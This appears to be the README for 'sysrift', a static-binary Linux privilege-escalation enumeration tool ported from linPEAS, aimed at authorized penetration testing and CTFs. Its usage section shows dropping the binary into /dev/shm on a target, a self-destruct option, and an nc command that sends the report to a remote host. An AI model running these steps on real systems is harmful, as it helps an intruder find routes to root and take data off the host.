# sysrift

A Linux privilege escalation enumeration tool compiled to a single static binary. Ported from [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) and rewritten in [Crystal](https://crystal-lang.org/) for drop-and-run deployment with no runtime dependencies.

## Why

linPEAS is the standard for Linux privesc enumeration, but it's a ~35,000 line Bash script that requires an interpreter, generates process noise, and buries findings in verbose output. sysrift addresses this:

- **Single static binary** -- drop in `/dev/shm`, run, delete. No interpreter, no dependencies.
- **Selective execution** -- run individual modules or combinations instead of a full sweep every time.
- **Severity-tagged output** -- `[!]` critical, `[+]` medium, `[-]` info, `[ok]` safe. Post-run summary surfaces only critical and medium findings.
- **Smaller footprint** -- one process, one log file. Self-destruct option removes the binary when done.
- **Cross-architecture** -- x86_64 and arm64 via static musl linking.

## Modules

| # | Module | What it checks |
|---|--------|---------------|
| 1 | System Information | Hostname, identity, kernel version, interesting groups, env vars, PATH hijacking, kernel CVEs (DirtyCow, Dirty Pipe, eBPF), mount option analysis (nosuid/noexec/nodev on key paths), unmounted fstab entries, fstab credential detection |
| 2 | SUID / SGID Binaries | Filesystem scan for SUID/SGID, GTFOBins cross-reference, owner UID filtering, writable SUID + SGID binary detection, unusual locations, nosuid mount cross-reference (downgrades SUID on nosuid mounts) |
| 3 | Sudo Rights | `sudo -l` analysis, `/etc/sudoers` + `/etc/sudoers.d/` enumeration, NOPASSWD entries, GTFOBins in sudo rules, env_keep dangerous variables (LD_PRELOAD, LD_LIBRARY_PATH, BASH_ENV, ENV, PATH), `!env_reset`, sudo version CVEs (Baron Samedit, CVE-2019-14287) |
| 4 | Credential Hunting | History files, config file credential patterns (with false positive filtering: sentinel values, .NET assembly metadata, ImageMagick templates), JS/JSON scanning limited to web deploy dirs (/var/www, /srv, /opt), /etc/shadow readability, /etc/passwd hashes, SSH keys, .netrc, cloud credentials |
| 5 | Writable Files & Dirs | High-value writable files (/etc/passwd, /etc/shadow, /etc/sudoers, /etc/ld.so.preload, etc.), world-writable directories |
| 6 | Network Information | Interfaces, routes, listening ports (flags databases, Docker API, admin panels, K8s, lateral movement targets), /etc/hosts, ARP, connections, forwarding |
| 7 | Processes, Cron & Timers | Root processes with writable binaries, crontab analysis, cron wildcard injection (tar, chown, chmod), cron target binary writability (/dev/null filtered), systemd timers |
| 8 | File Capabilities | `getcap` scan with dangerous capability flagging (21 caps including cap_setuid, cap_sys_admin, cap_bpf, etc.), `=ep` full capability set detection, cap+binary combo detection (43 entries across 11 caps), process capability sets, `/proc/[pid]/status` enumeration for non-zero CapEff/CapAmb across all processes (native hex decoding, zero capsh spawns) |
| 9 | NFS Shares | /etc/exports analysis (no_root_squash detection), showmount enumeration, active NFS mounts |
| 10 | Container / Docker | Docker/LXC/Kubernetes detection, Docker socket access, docker/lxd/lxc group membership, container escape checks (privileged mode, host mounts, procfs/sysfs writable escape surfaces, seccomp/NoNewPrivs) |
| 11 | Installed Software | Compilers, interpreters, transfer tools, package counts, web servers, known vulnerable software (screen, pkexec PwnKit, Exim) |
| 12 | Users & Groups | UID 0 users, interactive shell users, non-empty groups, login history, readable home directories, SSH file enumeration |
| 13 | Services | Running/enabled services, writable systemd unit files, writable init.d scripts |
| 14 | Interesting Files | Sensitive config files, backups, readable sensitive files, SUID outside standard paths, credential patterns in logs, recently modified files |
| 15 | Security Protections | AppArmor, SELinux, ASLR, mmap_min_addr, kptr_restrict, dmesg_restrict, perf_event_paranoid, ptrace_scope, seccomp, protected_symlinks/hardlinks, unprivileged_userns_clone, unprivileged_bpf_disabled, modules_disabled, module_sig_enforce, lockdown mode, grsecurity/PaX detection |

## Build

Requires [Crystal](https://crystal-lang.org/install/) 1.19+ for native builds. Docker builds use the official musl image.

```bash
# Native build (dynamic, for testing)
make local

# Static x86_64 binary via Docker
make x86_64

# Static arm64 binary via Docker + QEMU
make arm64

# Both architectures
make all

# Syntax/type check only (no binary output)
make check
```

### Prerequisites

| Target | Requires |
|--------|----------|
| `make local` | Crystal installed natively |
| `make x86_64` | Docker + `crystallang/crystal:latest-musl` |
| `make arm64` | Docker + QEMU binfmt (`sudo apt install qemu-user-static binfmt-support`) |

Output binaries are placed in `dist/`.

## Usage

```bash
# Drop to target
scp dist/linaudit_x86_64 user@target:/dev/shm/linaudit

# Run
chmod +x /dev/shm/linaudit && /dev/shm/linaudit
```

The interactive menu lets you:
- Run individual modules by number (e.g., `1` for System Information)
- Run multiple modules with comma separation (e.g., `1,3,5`)
- Run all modules with `0`
- List report files with `r`
- Self-destruct the binary with `x` (keeps report files)

Output is tee'd to a timestamped log file in `/dev/shm/` with ANSI codes stripped:

```bash
# View report
less -R /dev/shm/audit-report_<user>_<timestamp>.txt

# Copy off target
nc <remote-ip> 4444 < /dev/shm/audit-report_<user>_<timestamp>.txt
```

## Status

This is an active work-in-progress (v0.1.0). All 15 modules are functional. See [ARCHITECTURE.md](ARCHITECTURE.md) for design details and technical documentation.

## Legal

This tool is intended for authorized penetration testing, security research, and CTF competitions. Unauthorized use against systems you do not own or have explicit written permission to test is illegal. The author assumes no liability for misuse.

## Acknowledgements

sysrift is a port of [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) by [Carlos Polop](https://github.com/carlospolop), part of the [PEASS-ng](https://github.com/peass-ng/PEASS-ng) project. sysrift does not replicate every linPEAS check -- it focuses on the highest-signal vectors post-foothold, structured for selective execution rather than full-sweep output.
